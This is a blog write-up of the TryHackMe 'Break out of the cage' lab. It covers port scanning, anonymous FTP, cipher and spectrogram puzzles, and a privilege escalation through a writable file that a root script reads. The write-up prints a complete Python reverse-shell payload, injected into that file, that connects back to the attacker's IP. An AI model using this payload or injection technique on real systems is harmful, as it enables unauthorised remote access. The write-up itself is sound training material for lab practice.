<!DOCTYPE html>
<html lang="en">

<head><script src="/CCrashZer0/ccrashzer0.github.io/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=CCrashZer0/ccrashzer0.github.io/livereload" data-no-instant defer></script>
  <title>
  Break out of the cage: TryHackMe Writeup · CCrashZer0
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="CCrashZer0">
<meta name="description" content="
  Try Hack Me -
  
    
    Link to heading
  

Help Cage bring back his acting career and investigate the nefarious goings on of his agent!


  Objectives
  
    
    Link to heading
  


What is Weston&rsquo;s password?
What&rsquo;s the user flag?
What&rsquo;s the root flag?



  Recon
  
    
    Link to heading
  

Let&rsquo;s ping our maching and confirm that it is up and running.
Once you see a ping responces then take the IP address and plug it into your browser to see if their is a Ib service running.




It seem like I do have a Ib page comming up.
After clicking around it seems like none of the buttons actually work. So let&rsquo;s check out the source code of this page then.




There doesn&rsquo;t seems to be anything special in the source codes so how about me move on to scanning the site.">
<meta name="keywords" content="blog,developer,personal">



  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Break out of the cage: TryHackMe Writeup">
  <meta name="twitter:description" content="Try Hack Me - Link to heading Help Cage bring back his acting career and investigate the nefarious goings on of his agent!
Objectives Link to heading What is Weston’s password? What’s the user flag? What’s the root flag? Recon Link to heading Let’s ping our maching and confirm that it is up and running.
Once you see a ping responces then take the IP address and plug it into your browser to see if their is a Ib service running.
It seem like I do have a Ib page comming up.
After clicking around it seems like none of the buttons actually work. So let’s check out the source code of this page then. There doesn’t seems to be anything special in the source codes so how about me move on to scanning the site.">

<meta property="og:url" content="http://localhost:1313/CCrashZer0/ccrashzer0.github.io/tutorials/cage/">
  <meta property="og:site_name" content="CCrashZer0">
  <meta property="og:title" content="Break out of the cage: TryHackMe Writeup">
  <meta property="og:description" content="Try Hack Me - Link to heading Help Cage bring back his acting career and investigate the nefarious goings on of his agent!
Objectives Link to heading What is Weston’s password? What’s the user flag? What’s the root flag? Recon Link to heading Let’s ping our maching and confirm that it is up and running.
Once you see a ping responces then take the IP address and plug it into your browser to see if their is a Ib service running.
It seem like I do have a Ib page comming up.
After clicking around it seems like none of the buttons actually work. So let’s check out the source code of this page then. There doesn’t seems to be anything special in the source codes so how about me move on to scanning the site.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="tutorials">
    <meta property="article:published_time" content="2020-07-27T00:00:00+00:00">
    <meta property="article:modified_time" content="2020-07-27T00:00:00+00:00">




<link rel="canonical" href="http://localhost:1313/CCrashZer0/ccrashzer0.github.io/tutorials/cage/">


<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="/CCrashZer0/ccrashzer0.github.io/css/coder.css" media="screen">






  
    
    
    <link rel="stylesheet" href="/CCrashZer0/ccrashzer0.github.io/css/coder-dark.css" media="screen">
  



 




<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">

<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-auto">
  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="http://localhost:1313/CCrashZer0/ccrashzer0.github.io/">
      CCrashZer0
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="/CCrashZer0/ccrashzer0.github.io/about/">About</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/CCrashZer0/ccrashzer0.github.io/posts/">Blog</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/CCrashZer0/ccrashzer0.github.io/tutorials/">Tutorials</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container page">
  <article>
    <header>
      <h1 class="title">
        <a class="title-link" href="http://localhost:1313/CCrashZer0/ccrashzer0.github.io/tutorials/cage/">
          Break out of the cage: TryHackMe Writeup
        </a>
      </h1>
    </header>

    <h1 id="try-hack-me--">
  Try Hack Me -
  <a class="heading-link" href="#try-hack-me--">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<p>Help Cage bring back his acting career and investigate the nefarious goings on of his agent!</p>
<hr>
<h2 id="objectives">
  Objectives
  <a class="heading-link" href="#objectives">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<ol>
<li>What is Weston&rsquo;s password?</li>
<li>What&rsquo;s the user flag?</li>
<li>What&rsquo;s the root flag?</li>
</ol>
<hr>
<h2 id="recon">
  Recon
  <a class="heading-link" href="#recon">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>Let&rsquo;s ping our maching and confirm that it is up and running.<br>
Once you see a ping responces then take the IP address and plug it into your browser to see if their is a Ib service running.<br>
<figure><img src="/images/cage/webService.png">
</figure>

<br>
It seem like I do have a Ib page comming up.<br>
After clicking around it seems like none of the buttons actually work. So let&rsquo;s check out the source code of this page then.
<figure><img src="/images/cage/sourceCode.png">
</figure>

<br>
There doesn&rsquo;t seems to be anything special in the source codes so how about me move on to scanning the site.</p>
<h2 id="scanning-and-enumeration">
  Scanning and Enumeration
  <a class="heading-link" href="#scanning-and-enumeration">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>Command: <code>nmap -A -sC -sV -T4 -oN nmap\intinal.txt &lt;ip&gt;</code><br>
Breakdown:</p>
<pre tabindex="0"><code>-A: do an extensive scan on these ports

-sC: Scan with default NSE scripts. Considered useful for discovery and safe

-sV: Attempts to determine the version of the service running on port

-T4: speed of nmap scan is 4/5 (personal preference of mine)

-oN: Normal output to the file normal.file
</code></pre><p><figure><img src="/images/cage/nmap.png">
</figure>

Now that our intinal nmap scan is complet I can see that I have port 21, 22, and 80 open.<br>
Our FTP port &ldquo;21&rdquo; seems to have <code>Anonymous login alloId</code>, so lets try and log into it.<br>
<br>
<figure><img src="/images/cage/ftp.png">
</figure>

<br>
Now that I am logged into the FTP. let&rsquo;s see what I can find out.<br>
After running our <code>ls</code> command it seem that there is a file call <code>dad_task</code>. How about I download a copy of that file to our local computer, in order to do that you will just need to type in get <code>&lt;fileName&gt;</code> and a copy of it will be downloaded to your current directory.<br>
<figure><img src="/images/cage/downloadFile.png">
</figure>

<br>
Once the file has been downloaded let&rsquo;s <code>cat</code> out the content of it.<br>
Now just at first glance I was say that this is a base64 encoded string.</p>
<p><figure><img src="/images/cage/content.png">
</figure>

So now let&rsquo;s head over to <a href="https://gchq.github.io/CyberChef/"  class="external-link" target="_blank" rel="noopener">CyberChef</a> and see what happens when I use the From Base64 option.<br>
<br>
<figure><img src="/images/cage/output.png">
</figure>

After I decode the string from Base64 it seems that there is an additional cipher. I ran our results throug a couple of the cipher options from CyberChef and one stuck out to me, that was the vignere. This only stuck out to me because it required a key and it make me thing that I possible missed something.</p>
<p>I am going to use <code>GoBuster</code> to see if there are any hidden directories.
Command: <code>gobuster -t 40 -u http://$ip -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</code></p>
<p>Breakdown:</p>
<pre tabindex="0"><code>-t: Thread Usage, declare how mand thread you would like gobuster to use. (Default is 10)

-u: Full URL (including scheme), or base domain name.

-w: Path to the wordlist used for brute forcing (use – for stdin).
</code></pre><p><figure><img src="/images/cage/gobuster.png">
</figure>

<br>
Seems like there are several directories that I have not explored yet.<br>
After poking around in each directory it seems like auditions is the only one that has anyting interesting.<br>
In order to download the file I will have to use <code>wget http://&lt;ipaddres&gt;/auditions/must_practice_corrupt_file.mp3</code>
After playing the audio file you can hear that there is some distortion. So I loaded it up in <a href="https://www.audacityteam.org/"  class="external-link" target="_blank" rel="noopener">audacity</a>, clicked the arrow beside the file name, selected spectrogram, and zoomed in on the distorted area.<br>
<figure><img src="/images/cage/key.png">
</figure>

<br>
When you zoom in close enough you will see some text, perhaps this could be our key to the vignere cipher from eariler. So lets head back to CyberChef and see what happens when I enter it.
<br>
<figure><img src="/images/cage/westonPass.png">
</figure>

<br>
It lookes like I found our first flage and possible the username and password to SSH.<br>
When I tried to log in I was suprised that it was successfull. Now lets see if I can find our user.txt file.
<br>
<br></p>
<p>Once I are logged into the box lets confirm that I are. It sees I are in fact logged in as the Weston but it also seems that there is something running in the backgroud that is generating quotes.<br>
<br>
<figure><img src="/images/cage/ssh.png">
</figure>

Let&rsquo;s see if I can find out what is creating these quotes.</p>
<p><code>find / -type f -name &quot;*quote*&quot; -exec ls -la {} + 2&gt; /dev/null</code>
<figure><img src="/images/cage/quote.png">
</figure>

<br>
After a little bit of digging I was able to find out that <code>spread_the_quotes.py</code> is the script that is responible for writting the Nicolas Cage quotes to the console. Maybe I can leverage this and use it to our advantage.
Upon further investigation I found out that only the root user can write to our <code>spread_the_quotes.py</code> but the <code>quotes</code> file can be changed by anyone.</p>
<p>Since the <code>spread_the_quotes.py</code> actually calls <code>quotes</code> we may be able to use this to craft our reverse shell.<br>
I used <code>vim</code> to open up the quotes file and then used the keybindings of <code>%d</code> to remove all content.<br>
Once you have added your reverse shell you will just need to sit up your netcat listern on your local computer and wait for the call to be made.</p>
<p>Reverse Shell:</p>
<pre tabindex="0"><code>&#34;hello&#34; &amp;&amp; python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;Your IP Address&gt;&#34;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
</code></pre><p><strong>SUCCESS!!!</strong></p>
<p><figure><img src="/images/cage/listener.png">
</figure>

How about we see what kind of files there are and what is in them.<br>
There is a file called <code>Super_Duper_Checklist</code> and when we open it and look at the very last line it seems that we are presented what looks to be our user flag.<br>
<figure><img src="/images/cage/userFlag.png">
</figure>

<br></p>
<h2 id="getting-root">
  Getting Root
  <a class="heading-link" href="#getting-root">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<hr>
<p>Now that we have found out user flage we will need to figure out how we we can escalate the privilege ouf the cage user to a root user.<br>
After looking aroud some I was able to find three emails where a conversation had taken place between Sean, Cage, &amp; Weston.</p>
<ul>
<li>email_1
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">From - SeanArcher@BigManAgents.com
</span></span><span class="line"><span class="cl">To - Cage@nationaltreasure.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Hey Cage!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">There<span class="s1">&#39;s rumours of a Face/Off sequel, Face/Off 2 - Face On. It&#39;</span>s supposedly only in the
</span></span><span class="line"><span class="cl">planning stages at the moment. I<span class="s1">&#39;ve put a good word in for you, if you&#39;</span>re lucky we 
</span></span><span class="line"><span class="cl">might be able to get you a part of an angry shop keeping or something? Would you be up
</span></span><span class="line"><span class="cl"><span class="k">for</span> that, the money would be good and it<span class="err">&#39;</span>d look good on your acting CV.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Regards
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Sean Archer
</span></span></code></pre></div></li>
<li>email_2
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">From - Cage@nationaltreasure.com
</span></span><span class="line"><span class="cl">  To - SeanArcher@BigManAgents.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Dear Sean
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  We<span class="s1">&#39;ve had this discussion before Sean, I want bigger roles, I&#39;</span>m meant <span class="k">for</span> greater things.
</span></span><span class="line"><span class="cl">  Why aren<span class="s1">&#39;t you finding roles like Batman, The Little Mermaid(I&#39;</span>d make a great Sebastian!<span class="o">)</span>,
</span></span><span class="line"><span class="cl">  the new Home Alone film and why oh why Sean, tell me why Sean. Why did I not get a role in the
</span></span><span class="line"><span class="cl">  new fan made Star Wars films?! There was <span class="m">3</span> of them! <span class="m">3</span> Sean! I mean yes they were terrible films.
</span></span><span class="line"><span class="cl">  I could of made them great... great Sean.... I think you<span class="err">&#39;</span>re missing my <span class="nb">true</span> potential.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  On a much lighter note thank you <span class="k">for</span> helping me <span class="nb">set</span> up my home server, Weston helped too, but
</span></span><span class="line"><span class="cl">  not overally greatly. I gave him some smaller jobs. Whats your username on here? Root?
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Yours
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Cage
</span></span></code></pre></div></li>
<li>email_3
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">From - Cage@nationaltreasure.com
</span></span><span class="line"><span class="cl">To - Weston@nationaltreasure.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Hey Son
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
</span></span><span class="line"><span class="cl">down what it said. Could you look into it please? I think it could be something to <span class="k">do</span> with his
</span></span><span class="line"><span class="cl">account on here. I want to know what he<span class="s1">&#39;s hiding from me... I might need a new agent. Pretty
</span></span></span><span class="line"><span class="cl"><span class="s1">sure he&#39;</span>s out to get me. The note said:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">***************
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
</span></span><span class="line"><span class="cl">was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
</span></span><span class="line"><span class="cl">hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
</span></span><span class="line"><span class="cl">ahahahhahaha. Ahhh Face it... he<span class="err">&#39;</span>s just odd. 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Regards
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The Legend - Cage
</span></span></code></pre></div></li>
</ul>
<p>Within the latest email, we can see that there is a strings that looks like a chiper text. Now on the email, cage mentioned that his agent is obsessed with his face.
Earlier in this challenge we had to deciper some viginere text. So that is where we are going to start.</p>
<p>The dechipered text can be used as the root password for the machine</p>
<br>
<p>With the root password in hand I switched user using the <code>su</code> command and then confirmed that I was in fact Root.</p>
<p><img src="rootAccess.png" alt="rootAccess" title="rootAccess"><br>
Now that we have root access let check the <code>/root</code> directory to see if we can find out root flag.<br>
It would seem that instead of our root flag we have another <code>email_backup</code> folder and within that folder there are two emails.</p>
<ul>
<li>Email 1
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">From - SeanArcher@BigManAgents.com
</span></span><span class="line"><span class="cl">To - master@ActorsGuild.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Good Evening Master
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">My control over Cage is becoming stronger, I<span class="s1">&#39;ve been casting him into worse and worse roles.
</span></span></span><span class="line"><span class="cl"><span class="s1">Eventually the whole world will see who Cage really is! Our masterplan is coming together
</span></span></span><span class="line"><span class="cl"><span class="s1">master, I&#39;</span>m in your debt.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Thank you
</span></span></code></pre></div></li>
</ul>
<br>
<ul>
<li>
<p>Root flag</p>
<p>The root flag can be found inside one fo the file inside the <code>email_backup</code> folder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">From - master@ActorsGuild.com
</span></span><span class="line"><span class="cl">To - SeanArcher@BigManAgents.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Dear Sean
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">I<span class="s1">&#39;m very pleased to here that Sean, you are a good disciple. Your power over him has become
</span></span></span><span class="line"><span class="cl"><span class="s1">strong... so strong that I feel the power to promote you from disciple to crony. I hope you
</span></span></span><span class="line"><span class="cl"><span class="s1">don&#39;</span>t abuse your new found strength. To ascend yourself to this level please use this code:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">***********************************
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Thank you
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Sean Archer
</span></span></code></pre></div></li>
</ul>
<h2 id="congratulations-you-have-just-completed-the-break-out-the-cage-challenge">
  Congratulations you have just completed the Break Out The Cage challenge!
  <a class="heading-link" href="#congratulations-you-have-just-completed-the-break-out-the-cage-challenge">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>

  </article>
</section>

  

    </div>

    <footer class="footer">
  <section class="container">
    ©
    
      2019 -
    
    2025
     CCrashZer0 
    ·
    
    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
    
  </section>
</footer>

  </main>

  

  
  
  <script src="/CCrashZer0/ccrashzer0.github.io/js/coder.js"></script>
  

  

  


  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>
</html>
